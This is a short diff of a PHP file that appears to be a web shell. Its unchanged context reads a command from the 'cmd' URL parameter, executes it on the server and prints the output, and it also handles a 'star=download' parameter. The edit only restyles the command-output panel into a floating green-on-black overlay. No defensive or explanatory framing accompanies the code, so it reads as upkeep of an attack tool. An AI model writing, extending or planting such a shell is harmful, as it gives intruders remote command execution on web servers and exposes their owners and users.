@@ -128,18 +128,31 @@ if(isset($_GET['cmd'])){
     $cmd = $_GET['cmd'];
     $output = htmlspecialchars(exe($cmd));
     echo '
-    <div style="margin: 20px auto; width: 90%; max-width: 900px;">
-        <table width="100%" border="1" cellpadding="5" cellspacing="0" style="border-collapse: collapse; background: #f4f4f4; color: #000;">
-            <tr style="background: #333; color: #fff;">
-                <th>Command Output</th>
-            </tr>
-            <tr>
-                <td><pre style="white-space: pre-wrap; word-wrap: break-word;">' . $output . '</pre></td>
-            </tr>
-        </table>
+    <div style="
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        width: 500px;
+        max-height: 400px;
+        overflow: auto;
+        background: #111;
+        color: #0f0;
+        border: 2px solid lime;
+        padding: 10px;
+        z-index: 9999;
+        font-family: monospace;
+        font-size: 12px;
+        box-shadow: 0 0 15px lime;
+    ">
+        <div style="text-align:right; margin-bottom:5px;">
+            <a href="?" style="color:red; font-weight:bold;">[x]</a>
+        </div>
+        <b>Command Output:</b>
+        <pre style="white-space: pre-wrap;">' . $output . '</pre>
     </div>
     ';
 }
+
 
   
 if($_GET['star']=="download"){
